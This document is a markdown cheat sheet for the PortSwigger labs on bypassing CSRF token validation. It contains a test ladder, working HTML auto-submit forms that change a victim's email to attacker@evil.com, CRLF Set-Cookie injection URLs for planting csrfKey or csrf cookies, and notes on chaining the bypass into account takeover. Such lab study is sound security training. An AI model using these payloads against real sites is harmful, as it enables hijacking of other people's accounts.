# CSRF - Token bypass

Six ways CSRF token implementations fail: no token at all, token only validated on POST (switch to GET), token only validated when present (delete it), token not bound to session (reuse across accounts), token tied to a separate non-session cookie (inject that cookie), token duplicated in cookie only (inject any value for both).

## Quick reference
```
Ladder to try on any CSRF-protected form:
1) Remove csrf param entirely                    -> if accepted: "depends on being present"
2) Change POST to GET (keep csrf param)          -> if accepted: "depends on method"
3) Use your own csrf token in victim's session   -> if accepted: "not tied to session"
4) Swap both csrfKey cookie + csrf param         -> if accepted: "tied to non-session cookie"
5) Inject csrf cookie = csrf param (any value)   -> if accepted: "duplicated in cookie"

# Cookie injection via header injection in search param
/?search=x%0d%0aSet-Cookie:%20csrfKey=YOUR_KEY%3b%20SameSite=None
```

## Root cause
CSRF token validation has conditional logic: only validates on certain HTTP methods, only validates if the param is present, validates the token exists in a pool rather than against the specific session, or simply checks that a cookie matches a body param (both attacker-injectable).

## Find it
1. Submit the change-email form normally -> capture POST in Burp.
2. Modify csrf param value -> does it reject? If yes -> token is validated.
3. Delete csrf param entirely -> accepted? -> "depends on being present".
4. Change POST to GET (keep csrf param) -> accepted? -> "depends on method".
5. Log in with second account, get that account's csrf token -> use in first account's session -> accepted? -> "not tied to session".
6. Does a separate `csrfKey` cookie exist alongside `csrf` body param? Try swapping both across accounts.
7. Does csrf body param merely match a csrf cookie (both same value)? If so, inject matching values for both.

## Technique
**No defenses:** Generate PoC via Burp -> host on exploit server -> deliver to victim.

**Method bypass (GET):** Change POST to GET in Repeater; confirm accepted. Generate PoC using a GET form or `<script>document.location=...` with all params in the URL.

**Missing token:** Delete the csrf parameter (name AND value) from the request. If accepted, generate PoC omitting the csrf input entirely.

**Non-session token:** Capture your own csrf token; drop your own request (so it remains unused). In a PoC form, hardcode your unspent token. Victim submits form -> server validates token exists in the pool (not bound to session) -> accepted.

**Non-session cookie:**
1. Notice both `csrfKey` cookie and `csrf` body param exist.
2. Log in as second account; capture that account's csrfKey + csrf values.
3. Send update-email as second account but use first account's session cookie + second account's csrfKey + csrf -> rejected (session mismatch). Now swap csrfKey too -> accepted -> csrfKey is not tied to the session.
4. Cookie injection: find a reflected Set-Cookie injection point (e.g., search term reflected in Set-Cookie header via CRLF injection).
5. PoC with two stages:
   - First iframe: `GET /?search=x%0d%0aSet-Cookie:%20csrfKey=YOUR_KEY%3b%20SameSite=None` -> sets victim's csrfKey to your value.
   - Then submit change-email form with your matching csrf token.
   ```html
   <form method="POST" action="https://LAB/my-account/change-email">
     <input name="email" value="attacker@evil.com">
     <input name="csrf" value="YOUR_CSRF_TOKEN">
   </form>
   <img src="https://LAB/?search=x%0d%0aSet-Cookie:%20csrfKey=YOUR_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
   ```

**Duplicated cookie:** Both csrf body param and csrf cookie must match (any value). Inject both via same CRLF trick:
```html
<form method="POST" action="https://LAB/my-account/change-email">
  <input name="email" value="attacker@evil.com">
  <input name="csrf" value="FAKE">
</form>
<img src="https://LAB/?search=x%0d%0aSet-Cookie:%20csrf=FAKE%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

## Payload arsenal
```html
<!-- No defenses -->
<form method="POST" action="https://LAB/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>

<!-- Method bypass -->
<script>document.location="https://LAB/my-account/change-email?email=attacker@evil.com&csrf=ANY"</script>

<!-- Missing token - just omit csrf param -->
<form method="POST" action="https://LAB/my-account/change-email">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>

<!-- Non-session cookie injection + CSRF -->
<form method="POST" action="https://LAB/my-account/change-email" id=f>
  <input name="email" value="attacker@evil.com">
  <input name="csrf" value="YOUR_TOKEN">
</form>
<img src="https://LAB/?search=x%0d%0aSet-Cookie:%20csrfKey=YOUR_KEY%3b%20SameSite=None" onerror="document.getElementById('f').submit()">

<!-- Duplicated cookie injection + CSRF -->
<form method="POST" action="https://LAB/my-account/change-email" id=f>
  <input name="email" value="attacker@evil.com">
  <input name="csrf" value="FAKE">
</form>
<img src="https://LAB/?search=x%0d%0aSet-Cookie:%20csrf=FAKE%3b%20SameSite=None" onerror="document.getElementById('f').submit()">
```

## Bypasses
| Defense | Bypass |
|---|---|
| CSRF token present + wrong value rejected | Try deleting it / changing method / cross-account reuse |
| Token validated | Is it per-session? Test with second account's token |
| csrfKey cookie required | Inject via CRLF in Set-Cookie; pair with matching csrf body param |
| Token = cookie value | Inject both to any arbitrary matching value |

## Exploitation walkthrough
**Non-session cookie (most complex):**
1. Log in as wiener; submit change-email; capture POST with csrf and csrfKey.
2. Confirm: swapping csrfKey across accounts still validates -> not session-bound.
3. Find CRLF injection in search: `GET /?search=x%0d%0aSet-Cookie:%20csrfKey=...` sets a cookie in response.
4. PoC: `<img src="...CRLF-inject-csrfKey...">` fires first, sets cookie; `onerror` submits form with your matching csrf token.
5. Host on exploit server -> deliver -> victim's csrfKey becomes your value -> csrf token validates -> email changed.

## Chaining
- Token bypass -> change email -> password reset -> [Authentication](../../Authentication/) account takeover.
- Combine with [XSS](../../XSS/) to steal a valid CSRF token first if simpler bypass fails.

## Tools
- **Burp Repeater** - test each bypass (method, delete, swap)
- **Burp "Generate CSRF PoC"** - baseline PoC
- **Exploit server** - host PoC page, check access log

## Labs

### CSRF vulnerability with no defenses [Apprentice]
Generate CSRF PoC (Burp Pro) or write form manually -> host on exploit server -> deliver to victim -> email changed. Key insight: no protection at all means any cross-site form works.

### CSRF where token validation depends on request method [Practitioner]
Switch POST to GET -> token not validated. PoC: `<script>document.location="https://LAB/my-account/change-email?email=a@b.com&csrf=..."</script>`. Key insight: server only validates token on POST.

### CSRF where token validation depends on token being present [Practitioner]
Delete `csrf` parameter entirely -> request accepted. PoC: form without csrf input. Key insight: presence check, not value check - empty = validated.

### CSRF where token is not tied to user session [Practitioner]
Get an unused csrf token from your account -> use it in the victim's form. Must use the token before it's spent. Key insight: tokens are in a global pool, not per-session.

### CSRF where token is tied to non-session cookie [Practitioner]
csrfKey cookie + csrf param are linked to each other (not the session). Inject your csrfKey cookie via CRLF in search endpoint, then submit form with your csrf token. Key insight: cookies can be injected if any endpoint reflects Set-Cookie unsanitized headers.

### CSRF where token is duplicated in cookie [Practitioner]
csrf body param just needs to match csrf cookie - inject both to "FAKE" value via CRLF injection in search. Key insight: "double submit cookie" pattern is trivially bypassable if the cookie is injectable.

## Real-world notes
- The token ladder (no token -> method -> missing -> cross-session -> non-session cookie -> duplicated) should be routine on every state-changing endpoint.
- CRLF injection for cookie injection is rare but devastating when combined with CSRF.
- Non-session tokens are common in legacy apps that share a token pool for performance.

## References
- https://portswigger.net/web-security/csrf/bypassing-token-validation
